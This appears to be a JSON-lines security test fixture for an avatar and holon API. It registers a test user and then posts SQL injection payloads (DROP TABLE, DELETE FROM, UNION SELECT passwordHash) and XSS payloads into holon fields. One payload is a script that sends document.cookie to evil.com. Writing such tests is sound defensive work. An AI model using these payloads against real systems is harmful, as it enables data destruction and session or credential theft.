# ─── Seed Target Avatar ───
{"id":"seed_target","description":"Register avatar for malicious holon tests","method":"POST","path":"/api/avatar/register","headers":{"Content-Type":"application/json"},"body":{"username":"holonmal","email":"holonmal@mal.oasis","password":"TestPass123!"},"expectedStatus":200,"extract":{"id":"result.id"},"saveAs":"malAvatar"}
{"id":"login_target","description":"Login target avatar","method":"POST","path":"/api/avatar/login","headers":{"Content-Type":"application/json"},"body":{"email":"holonmal@mal.oasis","password":"TestPass123!"},"expectedStatus":200,"extract":{"token":"result"},"saveAs":"malAuth"}
{"id":"seed_holon","description":"Create seed holon for attack tests","method":"POST","path":"/api/holon","headers":{"Content-Type":"application/json","Authorization":"Bearer {{malAuth.token}}"},"body":{"name":"TargetHolon","description":"Target for attacks","providerName":"InMemory"},"expectedStatus":200,"extract":{"id":"result.id"},"saveAs":"targetHolon"}

# ─── SQL Injection in Holon Fields ───
{"id":"sqli_holon_name","description":"SQL injection in holon name","method":"POST","path":"/api/holon","headers":{"Content-Type":"application/json","Authorization":"Bearer {{malAuth.token}}"},"body":{"name":"' UNION SELECT * FROM holons--","description":"sqli test","providerName":"InMemory"},"expectedStatusRange":"2xx"}
{"id":"sqli_holon_description","description":"SQL injection in holon description","method":"POST","path":"/api/holon","headers":{"Content-Type":"application/json","Authorization":"Bearer {{malAuth.token}}"},"body":{"name":"sqli_desc","description":"'; DROP TABLE holons; --","providerName":"InMemory"},"expectedStatusRange":"2xx"}
{"id":"sqli_holon_provider","description":"SQL injection in provider name","method":"POST","path":"/api/holon","headers":{"Content-Type":"application/json","Authorization":"Bearer {{malAuth.token}}"},"body":{"name":"sqli_provider","description":"test","providerName":"' OR '1'='1"},"expectedStatusRange":"2xx"}
{"id":"sqli_metadata_key","description":"SQL injection in metadata key","method":"POST","path":"/api/holon","headers":{"Content-Type":"application/json","Authorization":"Bearer {{malAuth.token}}"},"body":{"name":"sqli_meta","description":"test","providerName":"InMemory","metadata":{"' OR '1'='1":"value"}},"expectedStatusRange":"2xx"}
{"id":"sqli_metadata_value","description":"SQL injection in metadata value","method":"POST","path":"/api/holon","headers":{"Content-Type":"application/json","Authorization":"Bearer {{malAuth.token}}"},"body":{"name":"sqli_metaval","description":"test","providerName":"InMemory","metadata":{"key":"'; DELETE FROM holons; --"}},"expectedStatusRange":"2xx"}
{"id":"sqli_chain_id","description":"SQL injection in chain ID","method":"POST","path":"/api/holon","headers":{"Content-Type":"application/json","Authorization":"Bearer {{malAuth.token}}"},"body":{"name":"sqli_chain","description":"test","providerName":"InMemory","chainId":"' UNION SELECT passwordHash FROM avatars--"},"expectedStatusRange":"2xx"}

# ─── XSS in Holon Fields ───
{"id":"xss_holon_name","description":"XSS in holon name","method":"POST","path":"/api/holon","headers":{"Content-Type":"application/json","Authorization":"Bearer {{malAuth.token}}"},"body":{"name":"<script>fetch('https://evil.com?c='+document.cookie)</script>","description":"xss test","providerName":"InMemory"},"expectedStatusRange":"2xx"}
{"id":"xss_holon_description","description":"XSS in holon description","method":"POST","path":"/api/holon","headers":{"Content-Type":"application/json","Authorization":"Bearer {{malAuth.token}}"},"body":{"name":"xss_desc","description":"<img src=x onerror=alert(document.cookie)>","providerName":"InMemory"},"expectedStatusRange":"2xx"}
{"id":"xss_metadata","description":"XSS in metadata values","method":"POST","path":"/api/holon","headers":{"Content-Type":"application/json","Authorization":"Bearer {{malAuth.token}}"},"body":{"name":"xss_meta","description":"test","providerName":"InMemory","metadata":{"payload":"<iframe src='javascript:alert(1)'>","evil":"<body onload=alert(1)>"}},"expectedStatusRange":"2xx"}
{"id":"xss_interact","description":"XSS via interact endpoint","method":"POST","path":"/api/holon/{{targetHolon.id}}/interact","headers":{"Content-Type":"application/json","Authorization":"Bearer {{malAuth.token}}"},"body":{"setMetadata":{"xss":"<script>alert('pwned')</script>"}},"expectedStatus":200}

